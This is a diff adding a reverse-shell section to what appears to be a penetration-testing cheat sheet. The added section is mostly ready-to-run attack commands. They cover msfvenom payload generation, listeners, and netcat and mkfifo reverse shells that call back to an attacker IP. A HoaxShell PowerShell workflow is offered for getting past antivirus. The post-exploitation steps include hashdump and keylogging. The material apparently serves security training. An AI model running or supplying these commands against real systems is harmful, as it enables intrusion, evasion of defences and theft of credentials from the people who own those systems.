@@ -730,11 +730,124 @@ Enter-PSSession -ComputerName DC01
 
 ---
 
+## Gaining Access to Remote System Using Reverse Shell Generator (Web GUI)
+
+**Start the tool:**
+```bash
+docker run -d -p 80:80 reverse_shell_generator
+# If error: service apache2 stop, then retry
+```
+**Access:** http://localhost
+
+### MSFVenom Payload Generation
+
+#### Common Payload Commands
+```bash
+# Windows Meterpreter Reverse TCP (x64)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o reverse.exe
+
+# Windows Meterpreter Reverse TCP (x86)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o reverse.exe
+
+# Linux Reverse Shell ELF
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf -o shell.elf
+
+# PHP Reverse Shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw -o shell.php
+
+# Python Reverse Shell
+msfvenom -p python/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw -o shell.py
+
+# ASP Reverse Shell (for IIS)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp -o shell.asp
+```
+
+### Setting Up Listener
+
+#### Metasploit Listener
+```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST [YOUR IP]
+set LPORT 4444
+run
+```
+
+#### Netcat Listener
+```bash
+nc -lvnp 4444          # Basic listener
+nc -lvnp 443           # Use common port to blend in
+```
+
+### Netcat Reverse Shells (Quick Reference)
+
+**Set up listener on attacker:**
+```bash
+nc -lvnp 4444
+```
+
+**Trigger from victim:**
+```bash
+# Linux
+nc -e /bin/bash [ATTACKER IP] 4444
+nc -e /bin/sh [ATTACKER IP] 4444
+
+# Windows
+nc -e cmd.exe [ATTACKER IP] 4444
+
+# If -e not available (Linux)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [ATTACKER IP] 4444 > /tmp/f
+```
+
+### HoaxShell (PowerShell Payload)
+Used when msfvenom payloads are caught by AV — generates PowerShell based reverse shell.
+
+**Workflow:**
+1. In Reverse Shell Generator → select **HoaxShell** tab
+2. Select **PowerShell IEX** from left pane
+3. Change port to `444`
+4. Copy payload → save as `shell.ps1`
+5. Select **hoaxshell** as listener type → copy → run in terminal
+6. Deliver `shell.ps1` to victim
+
+**Run on victim (Windows PowerShell as Admin):**
+```powershell
+cd C:\Users\Admin\Desktop\
+.\shell.ps1
+```
+
+### Post-Exploitation (After Session Opens)
+
+#### Meterpreter Commands
+```bash
+getuid              # Current user ID
+sysinfo             # System information
+getsystem           # Attempt privilege escalation
+hashdump            # Dump password hashes
+shell               # Drop into cmd shell
+ps                  # List running processes
+migrate [PID]       # Migrate to another process
+upload [file]       # Upload file to target
+download [file]     # Download file from target
+screenshot          # Take screenshot
+keyscan_start       # Start keylogger
+keyscan_dump        # Dump keylogger output
+```
+
+#### Whoami / Verification
+```bash
+whoami              # Show current user
+getuid              # Meterpreter user ID
+ipconfig            # Network interfaces
+```
+
+Note: Stabalize shell by running `python3 -c 'import pty; pty.spawn("/bin/bash")'` after catching shell 
+
+
+---
+
 ## Web App Exploitation
-
-### Burp Suite
-
-## Web App/Server Exploitation
 
 ### Burp Suite
 
